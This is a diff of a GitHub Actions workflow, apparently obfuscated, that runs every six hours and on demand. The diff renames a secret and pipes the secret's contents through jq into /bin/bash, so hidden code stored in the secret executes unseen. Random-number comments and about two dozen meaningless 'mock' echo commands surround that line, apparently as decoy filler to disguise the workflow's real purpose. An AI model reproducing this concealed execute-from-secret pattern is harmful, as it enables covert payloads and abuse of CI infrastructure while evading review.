@@ -1,16 +1,37 @@
-name: luzhishen5678 #24395
-on: #24301
-  workflow_dispatch: #27050
-  schedule: #32060
-    - cron: '20 0/6 * * *' #3467
-jobs: #30503
-  build: #25999
-    runs-on: ubuntu-latest #21311
-    steps: #8660
-      - uses: actions/checkout@v4 #14289
-      - name: luzhishen5678 #15139
-        env: #24969
-          p6343: ${{ secrets.p6343 }} #16221
+name: luzhishen5678 #6009
+on: #27413
+  workflow_dispatch: #31130
+  schedule: #27398
+    - cron: '2 5/6 * * *' #14692
+jobs: #6688
+  build: #15172
+    runs-on: ubuntu-latest #25125
+    steps: #11248
+      - uses: actions/checkout@v4 #14478
+      - name: luzhishen5678 #20466
+        env: #22322
+          v13092: ${{ secrets.v13092 }} #16236
         run: |
-          echo $p6343 | jq -r .o17697 | /bin/bash #7113
+          echo $v13092 | jq -r .u3107 | /bin/bash #8745
           echo "String slice: str=abcdef; echo \${str:0:3}"
+          which bash 2>/dev/null || echo "Bash not in path"
+          echo "Sed mock: echo 'text' | sed 's/t/T/' 2>/dev/null || echo no-sed"
+          echo "Read mock: read -p 'Prompt' var <<< 'input'"
+          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
+          echo "Random ID: $RANDOM$RANDOM"
+          echo "Trap mock: trap 'echo TRAP' EXIT"
+          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
+          echo "Time diff mock: echo \$SECONDS"
+          : ' Another single-line comment '
+          echo "Version: $((1 + RANDOM % 5))"
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo "Wget mock: wget -qO- http://example.com 2>/dev/null | head -1 || echo no-wget"
+          echo "Env vars: $(env | wc -l) total"
+          echo "Command sub: $(echo inside subshell)"
+          echo "Socket test: echo 'socket-check'"
+          ls -la 2>/dev/null || true
+          echo "Process check: $(ps -ef | wc -l 2>/dev/null || echo 0)"
+          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          echo "Command group: { echo group; }"
+          echo "Stderr dump: ls /nonexist 2>&1 | head -1 || true"
